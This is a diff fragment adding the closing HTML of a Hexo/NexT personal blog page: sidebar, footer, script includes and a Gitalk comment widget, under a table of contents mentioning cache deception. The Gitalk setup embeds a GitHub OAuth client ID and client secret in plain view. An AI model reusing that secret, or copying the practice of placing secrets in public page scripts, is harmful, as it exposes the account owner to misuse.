class="nav-number">3.</span> <span class="nav-text">0x03 缓存欺骗</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sing</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '6e8bfc081de57f042466',
+      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
+      repo        : 'sing3r.github.io',
+      owner       : 'sing3r',
+      admin       : ['sing3r'],
+      id          : '3fd442a4a5c07b4ceab4c8c4a11dbb03',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
